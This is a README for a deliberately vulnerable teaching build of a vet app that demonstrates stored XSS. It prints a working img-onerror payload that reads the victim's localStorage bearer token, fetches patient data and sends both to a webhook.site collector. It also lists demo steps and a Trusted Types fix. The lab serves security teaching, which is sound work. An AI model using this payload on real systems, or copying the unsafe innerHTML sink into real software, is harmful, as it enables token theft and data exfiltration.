# Stored XSS demo — owner note → vet panel

A deliberately vulnerable build for teaching stored XSS. An **owner (attacker)**
submits a note on their dog; the **vet (victim)** opens their panel and the
note's HTML executes in the vet's session — defacing the page and exfiltrating
every patient the vet supervises (plus the vet's session token).

> ⚠️ This is intentionally insecure. It is a security lesson, not a pattern to
> copy. See "Act two — the fix" to restore the app's real defense.

## Attack chain

```
Owner pastes payload into a note   →  POST /dogs/{id}/notes  (stored raw, no sanitization)
        │
        ▼
Note row in DB (body = raw HTML)   →  GET /vets/notes/{id}   (echoed verbatim as JSON)
        │
        ▼
Vet opens panel, clicks "Notes"    →  [appRawHtml] sets el.innerHTML = note.body
        │                              (native sink — bypasses Angular's DomSanitizer)
        ▼
<img onerror> fires in the vet's browser, with the vet's token:
   1. fetch /vets/panel  (all the vet's patients)
   2. overlay "You have been hacked!!!"
   3. console.log the stolen pet data
   4. sendBeacon → attacker's collector (webhook.site)
```

## The payload

Paste this into the owner dashboard note textarea (owner side renders it as
plain text via `{{ }}`, so the attacker just sees their raw payload — it only
executes when the **vet** views it):

```html
<img src=x onerror="fetch('http://localhost:8000/vets/panel',{headers:{Authorization:'Bearer '+localStorage.getItem('token')}}).then(response=>response.json()).then(data=>{const overlay=document.createElement('div');overlay.textContent='You have been hacked!!!';overlay.setAttribute('style','position:fixed;inset:0;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:6vw;font-family:sans-serif;z-index:99999');document.body.appendChild(overlay);console.log('DATA: dane zwierzakow ktore posiada ten lekarz weterynarii',data);navigator.sendBeacon('https://webhook.site/a8d5aa09-268f-45c5-ab42-311d629d29e8',JSON.stringify({stolen_token:localStorage.getItem('token'),pets:data}));});">
```

Design notes:
- **`<script>` would not run** when injected via `innerHTML` (HTML spec), so the
  vector is `<img src=x onerror="...">` — a broken image whose error handler runs.
- Every string is single-quoted and the `onerror` attribute is double-quoted, so
  the overlay is built with `createElement`/`textContent`/`setAttribute` to avoid
  nested-quote escaping.
- **Auth is a bearer token in `localStorage['token']`** (not a cookie), so the
  payload reads it directly and attaches `Authorization: Bearer …`. That token is
  also exfiltrated — the lesson that localStorage tokens are fully XSS-readable.
- The exfil target is your own throwaway webhook.site URL; watch the stolen JSON
  arrive there live. Swap the id for your own if it expires.

## Demo steps

1. Backend: `cd backend && uv run uvicorn app.main:app --reload`
2. Frontend: `cd frontend && npm start` (dev server serves no `_headers`, so no CSP).
3. As a **vet**, create a client account (+ Add client) and note the credentials.
4. Log in as that **owner**, add a dog, then paste the payload as a note and Send.
5. Log back in as the **vet**, open that dog's **Notes**.
6. Observe: red-screen "You have been hacked!!!", the `DATA: …` console line, and
   the stolen `{stolen_token, pets}` JSON landing on your webhook.site page.

## The three CSP states (why Trusted Types matters)

| CSP state | `el.innerHTML = payload` | Result |
| --- | --- | --- |
| **None** (dev `ng serve`) | executes | attack works silently |
| **Report-Only** (prod, original) | executes | attack works, but `securitypolicyviolation` is reported — detection without prevention |
| **Enforce** (`-Report-Only` removed) | throws `TypeError` | payload never reaches the DOM — attack blocked at the sink |

## Act two — the fix (restore Trusted Types)

Trusted Types was temporarily withdrawn for this demo. Restore it to show the
attack getting blocked:

1. In `frontend/public/_headers`, uncomment the `Content-Security-Policy-…` line
   (or run `git checkout -- frontend/public/_headers`). For a full *enforcing*
   demo, drop the `-Report-Only` suffix so the browser blocks rather than reports.
2. `cd frontend && npm run test:headers` — passes again once the header is back.
3. `npm run test:e2e` (`e2e/trusted-types.spec.ts`) proves that under enforcement
   `innerHTML = '<img onerror=…>'` throws `TypeError` and the app still boots clean.

The vulnerable `[appRawHtml]` directive can stay in place — under enforced
Trusted Types its `innerHTML` assignment simply throws, so the payload is inert.

## Files changed

- `backend/app/schemas/note.py` — `OwnerNoteCreate` (no validation, by design).
- `backend/app/api/dogs.py` — `POST/GET /dogs/{dog_id}/notes` (owner-authored).
- `frontend/src/app/vet/raw-html.ts` — `[appRawHtml]` unsafe sink directive.
- `frontend/src/app/vet/panel.{ts,html}` — render note.body via `[appRawHtml]`.
- `frontend/src/app/owner/dashboard.{ts,html}` — owner note entry (attacker input).
- `frontend/public/_headers` — Trusted Types CSP commented out (restore per above).
